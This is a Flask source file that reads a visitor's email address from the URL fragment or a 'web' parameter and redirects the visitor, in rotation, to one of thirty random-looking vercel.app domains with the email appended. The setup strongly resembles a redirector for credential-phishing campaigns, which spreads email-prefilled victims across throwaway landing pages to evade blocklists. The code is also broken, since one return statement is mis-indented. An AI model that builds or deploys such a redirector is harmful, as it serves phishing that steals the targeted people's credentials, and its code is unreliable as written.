from flask import Flask, redirect, request, render_template_string
import os

app = Flask(__name__)
application = app

DOMAINS = [
    'https://repository-zesjhdzxvuygbjkj-xfytgid.vercel.app',
    'https://gxygyygdstc-rsrvuhcvhchj-hfxgdxjgcg.vercel.app',
    'https://srdytiyyyx4er75-res56r7tyycx6fgigc8.vercel.app',
    'https://repository-zesjhdzxvuygbjkj-xfytgid-ten.vercel.app',
    'https://gxygyygdstc-rsrvuhcvhchj-hfxgdxjgcg-ten.vercel.app',
    'https://srdytiyyyx4er75-res56r7tyycx6fgigc8-alpha.vercel.app',
    'https://repository-zesjhdzxvuygbjkj-xfytgid-sable.vercel.app',
    'https://gxygyygdstc-rsrvuhcvhchj-hfxgdxjgcg-seven.vercel.app',
    'https://srdytiyyyx4er75-res56r7tyycx6fgigc8-zeta.vercel.app',
    'https://repository-zesjhdzxvuygbjkj-xfytgid-six.vercel.app',
    'https://gxygyygdstc-rsrvuhcvhchj-hfxgdxjgcg-wheat.vercel.app',
    'https://srdytiyyyx4er75-res56r7tyycx6fgigc8-eight.vercel.app',
    'https://repository-zesjhdzxvuygbjkj-xfytgid-two.vercel.app',
    'https://gxygyygdstc-rsrvuhcvhchj-hfxgdxjgcg-gray.vercel.app',
    'https://srdytiyyyx4er75-res56r7tyycx6fgigc8-tan.vercel.app',
    'https://repository-zesjhdzxvuygbjkj-xfytgid-seven.vercel.app',
    'https://gxygyygdstc-rsrvuhcvhchj-hfxgdxjgcg-peach.vercel.app',
    'https://srdytiyyyx4er75-res56r7tyycx6fgigc8-rouge.vercel.app',
    'https://repository-zesjhdzxvuygbjkj-xfytgid-rho.vercel.app',
    'https://gxygyygdstc-rsrvuhcvhchj-hfxgdxjgcg-two.vercel.app',
    'https://srdytiyyyx4er75-res56r7tyycx6fgigc8-nine.vercel.app',
    'https://repository-zesjhdzxvuygbjkj-xfytgid-three.vercel.app',
    'https://gxygyygdstc-rsrvuhcvhchj-hfxgdxjgcg-kohl.vercel.app',
    'https://srdytiyyyx4er75-res56r7tyycx6fgigc8-tau.vercel.app',
    'https://repository-zesjhdzxvuygbjkj-xfytgid-iota.vercel.app',
    'https://gxygyygdstc-rsrvuhcvhchj-hfxgdxjgcg-jet.vercel.app',
    'https://srdytiyyyx4er75-res56r7tyycx6fgigc8-lilac.vercel.app',
    'https://repository-zesjhdzxvuygbjkj-xfytgid-ruddy.vercel.app',
    'https://gxygyygdstc-rsrvuhcvhchj-hfxgdxjgcg-liart.vercel.app',
    'https://srdytiyyyx4er75-res56r7tyycx6fgigc8-xi.vercel.app'
]

# Initialize counter
current_index = 0

@app.route('/')
def round_robin_balancer():
    global current_index
    
    # Try to get email from query parameter first (?web=email@email.com)
    email = request.args.get('web', '')
    
    # If no query parameter, serve a page that can handle the fragment
    if not email:
    return render_template_string('''
        <div id="status"></div>
        <script>
            const status = document.getElementById('status');
    
            if (window.location.hash) {
                let email = window.location.hash.substring(1);
                window.location.href = '/?web=' + encodeURIComponent(email);
            } else {
                status.innerText = 'Invalid email';
            }
        </script>
    ''')

    
    # Basic email validation
    if not email or '@' not in email or '.' not in email:
        return "Invalid email.", 400
    
    # Get next domain in round-robin sequence
    target_domain = DOMAINS[current_index]
    
    # Increment index for next request
    current_index = (current_index + 1) % len(DOMAINS)
    
    # Construct target URL with the required ?web= parameter format
    target_url = f"{target_domain}/?web={email}"
    
    # Instant redirect
    return redirect(target_url, code=302)

if __name__ == '__main__':
    app.run(debug=True)